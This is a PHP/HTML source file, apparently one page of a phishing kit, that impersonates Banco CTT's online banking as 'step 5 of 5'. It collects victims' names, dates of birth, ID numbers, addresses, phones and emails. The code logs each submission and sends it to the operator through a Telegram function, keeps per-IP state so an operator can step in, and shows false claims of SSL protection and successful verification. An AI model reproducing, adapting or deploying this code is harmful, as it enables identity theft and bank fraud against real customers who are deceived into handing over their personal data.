<?php
// ===== STEP 5: BILLING ADDRESS =====
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'send_billing') {
    $fullname = trim($_POST['full_name'] ?? '');
    $address  = trim($_POST['address'] ?? '');
    $city     = trim($_POST['city'] ?? '');
    $zip      = trim($_POST['zip'] ?? '');
    $phone    = trim($_POST['phone'] ?? '');
    $email    = trim($_POST['email'] ?? '');
    $country  = trim($_POST['country'] ?? '');
    $dob      = trim($_POST['dob'] ?? '');
    $idnum    = trim($_POST['id_number'] ?? '');
    $ip       = $_SERVER['REMOTE_ADDR'];
    
    $data = array(
        '👤 Full Name'      => $fullname,
        '🏠 Address'        => $address,
        '🏙 City'           => $city,
        '📮 ZIP'            => $zip,
        '🌍 Country'        => $country,
        '📞 Phone'          => $phone,
        '📧 Email'          => $email,
        '🎂 Date of Birth'  => $dob,
        '🆔 ID Number'      => $idnum
    );
    log_capture('BILLING', $ip, array(
        'full_name' => $fullname, 'address' => $address, 'city' => $city, 
        'zip' => $zip, 'phone' => $phone, 'email' => $email, 
        'country' => $country, 'dob' => $dob, 'id_number' => $idnum
    ));
    send_telegram_capture('BILLING', 'FULL BILLING', $ip, $data);
    
    $state = get_state($ip);
    if (!$state) $state = array('ip' => $ip, 'completed' => array(), 'data' => array());
    $state['current_step'] = 'billing';
    $state['action'] = 'wait';
    $state['completed']['billing'] = date('Y-m-d H:i:s');
    $state['data']['billing'] = array(
        'full_name' => $fullname, 'address' => $address, 'city' => $city, 
        'zip' => $zip, 'phone' => $phone, 'email' => $email, 
        'country' => $country, 'dob' => $dob, 'id_number' => $idnum
    );
    save_state($ip, $state);
    
    header('Content-Type: application/json');
    echo json_encode(array('status' => 'ok', 'redirect' => 'loading.php'));
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dados de Faturação | Banco CTT Online</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Segoe UI","Segoe",Tahoma,Helvetica,Arial,sans-serif;font-size:13px;color:#444;background:#f4f4f4;min-height:100vh;padding:30px 0}
.card{background:#fff;border-radius:8px;max-width:560px;width:90%;margin:0 auto;box-shadow:0 2px 12px rgba(0,0,0,0.06);overflow:hidden}
.header-bar{background:#222222;color:#fff;text-align:center;padding:10px;font-size:12px;font-weight:600;letter-spacing:0.5px}
.progress{display:flex;gap:4px;padding:14px 30px;background:#f9f9f9;border-bottom:1px solid #e1e1e1}
.progress .seg{flex:1;height:4px;background:#e1e1e1;border-radius:2px}
.progress .seg.done{background:#df0024}
.progress .seg.active{background:#006a91}
.logo{text-align:center;padding:20px 30px 0}
.logo img{height:30px}
.body{padding:20px 30px 30px}
h2{font-size:18px;font-weight:500;color:#222222;margin-bottom:8px;text-align:center}
.subtitle{font-size:13px;color:#666;text-align:center;margin-bottom:24px;line-height:1.5}
.section-title{font-size:12px;font-weight:700;color:#222222;text-transform:uppercase;letter-spacing:0.5px;margin:18px 0 10px;padding-bottom:4px;border-bottom:1px solid #e1e1e1}
.section-title:first-child{margin-top:0}
.form-group{margin-bottom:14px}
.form-group label{display:block;font-size:12px;color:#555;margin-bottom:4px;font-weight:600}
.form-group input,.form-group select{width:100%;padding:10px 12px;border:1px solid #c8c8c8;border-radius:4px;font-size:14px;font-family:inherit;transition:border 0.15s}
.form-group input:focus,.form-group select:focus{outline:none;border-color:#006a91;box-shadow:0 0 0 2px rgba(0,106,145,0.15)}
.form-row{display:flex;gap:10px}
.form-row .form-group{flex:1}
.btn{width:100%;padding:12px;background:#df0024;color:#ffffff;border:none;border-radius:4px;font-size:15px;font-weight:700;cursor:pointer;letter-spacing:0.5px;margin-top:14px}
.btn:hover{background:#b8001d}
.error-msg,.success-msg{display:none;padding:10px 14px;border-radius:4px;margin-bottom:16px;font-size:13px;text-align:center}
.success-msg{background:#d4edda;border:1px solid #c3e6cb;color:#155724}
.error-msg{background:#f8d7da;border:1px solid #f5c6cb;color:#721c24}
.success-msg.show,.error-msg.show{display:block}
.security{display:flex;align-items:center;gap:8px;margin-top:14px;font-size:11px;color:#888;justify-content:center}
</style>
</head>
<body>
<div class="card">
    <div class="header-bar">Passo 5 de 5 — Dados de Faturação &amp; Identificação</div>
    <div class="progress">
        <div class="seg done"></div>
        <div class="seg done"></div>
        <div class="seg done"></div>
        <div class="seg done"></div>
        <div class="seg active"></div>
    </div>
<div class="logo"><img src="https://thebanks.eu/img/logos/Banco_CTT.png" alt="Banco CTT" onerror="this.outerHTML='<span style=font-size:18px;font-weight:700;color:#222222>Banco CTT</span>'"></div>
    <div class="body">
        <h2>Dados de Faturação &amp; Identificação</h2>
        <p class="subtitle">Preencha os seus dados pessoais para concluir a identificação</p>

        <div class="error-msg" id="errorMsg">Os dados não são válidos. Verifique os campos.</div>
        <div class="success-msg" id="successMsg">✓ Os seus dados foram verificados com sucesso.</div>

        <form id="billingForm">
            <div class="section-title">Dados Pessoais</div>
            <div class="form-group">
                <label>Nome completo</label>
                <input type="text" name="full_name" placeholder="ex.: JOÃO DA SILVA" required>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Data de Nascimento</label>
                    <input type="text" name="dob" placeholder="DD/MM/YYYY" maxlength="10" required>
                </div>
                <div class="form-group">
                    <label>Número de Identificação</label>
                    <input type="text" name="id_number" placeholder="ex.: CC 123456" required>
                </div>
            </div>

            <div class="section-title">Morada</div>
            <div class="form-group">
                <label>Endereço</label>
                <input type="text" name="address" placeholder="Rua, Número" required>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Cidade</label>
                    <input type="text" name="city" placeholder="ex.: LISBOA" required>
                </div>
                <div class="form-group">
                    <label>Código Postal</label>
                    <input type="text" name="zip" placeholder="ex.: 1000-001" maxlength="10" required>
                </div>
            </div>
            <div class="form-group">
                <label>País</label>
                <select name="country" required>
                    <option value="">Selecione o país...</option>
                    <option value="GR">Portugal</option>
                    <option value="CY">Espanha</option>
                    <option value="DE">França</option>
                    <option value="UK">Reino Unido</option>
                    <option value="US">Brasil</option>
                    <option value="other">Outro</option>
                </select>
            </div>

            <div class="section-title">Dados de Contacto</div>
            <div class="form-group">
                <label>Número de Telefone</label>
                <input type="text" name="phone" placeholder="+30 69XXXXXXXX" required id="phoneInput">
            </div>
            <div class="form-group">
                <label>Email</label>
                <input type="email" name="email" placeholder="email@example.com" required>
            </div>

            <button type="submit" class="btn">CONCLUIR</button>
            <div class="security">🔒 Os seus dados estão protegidos com encriptação SSL de 256 bits</div>
        </form>
    </div>
</div>

<script>
document.getElementById('phoneInput').addEventListener('input', function(){
    this.value = this.value.replace(/[^0-9+\s\-()]/g, '');
});

document.getElementById('billingForm').addEventListener('submit', function(e){
    e.preventDefault();
    var form = this;
    var fd = new FormData(form);
    fd.append('action', 'send_billing');
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.onreadystatechange = function(){
        if(xhr.readyState === 4 && xhr.status === 200){
            var resp = JSON.parse(xhr.responseText);
            if(resp.status === 'ok'){
                document.getElementById('successMsg').classList.add('show');
                document.getElementById('errorMsg').classList.remove('show');
                form.querySelectorAll('input,select').forEach(function(el){ el.disabled = true; });
                form.querySelector('.btn').disabled = true;
                setTimeout(function(){ window.location.href = resp.redirect; }, 1000);
            }
        }
    };
    xhr.send(fd);
});

// auto-format DOB
document.querySelector('[name=dob]').addEventListener('input', function(){
    var v = this.value.replace(/[^0-9]/g, '').slice(0, 8);
    if(v.length >= 5) v = v.slice(0,2) + '/' + v.slice(2,4) + '/' + v.slice(4);
    else if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
    this.value = v;
});
</script>
</body>
</html>